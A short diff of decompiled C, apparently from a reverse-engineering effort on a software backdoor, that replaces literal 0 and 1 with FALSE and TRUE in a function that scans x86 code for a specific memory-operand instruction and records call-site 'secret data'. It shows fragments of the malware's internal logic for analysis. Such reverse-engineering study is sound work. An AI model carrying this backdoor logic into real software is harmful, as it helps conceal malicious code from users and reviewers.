@@ -22,8 +22,8 @@ BOOL find_instruction_with_mem_operand_ex
   undefined4 local_80 [22];
   
   bVar5 = 0;
-  BVar2 = secret_data_append_from_call_site((secret_data_shift_cursor_t)0xd6,4,0xe,0);
-  if (BVar2 != 0) {
+  BVar2 = secret_data_append_from_call_site((secret_data_shift_cursor_t)0xd6,4,0xe,FALSE);
+  if (BVar2 != FALSE) {
     puVar4 = local_80;
     for (lVar3 = 0x16; lVar3 != 0; lVar3 = lVar3 + -1) {
       *puVar4 = 0;
@@ -34,7 +34,7 @@ BOOL find_instruction_with_mem_operand_ex
     }
     for (; code_start < code_end; code_start = code_start + 1) {
       BVar2 = x86_dasm(dctx,code_start,code_end);
-      if ((((BVar2 != 0) &&
+      if ((((BVar2 != FALSE) &&
            (iVar1._0_1_ = dctx->_unknown810[0], iVar1._1_1_ = dctx->_unknown810[1],
            iVar1._2_1_ = dctx->_unknown810[2], iVar1._3_1_ = dctx->field_0x2b, iVar1 == opcode)) &&
           (((dctx->field2_0x10).field0.field11_0xc.modrm_word & 0xff00ff00) == 0x5000000)) &&
@@ -42,10 +42,10 @@ BOOL find_instruction_with_mem_operand_ex
           ((((dctx->field2_0x10).field0.flags2 & 1) != 0 &&
            ((u8 *)mem_address ==
             dctx->instruction + dctx->instruction_size + *(long *)dctx->_unknown812)))))) {
-        return 1;
+        return TRUE;
       }
     }
   }
-  return 0;
+  return FALSE;
 }
 
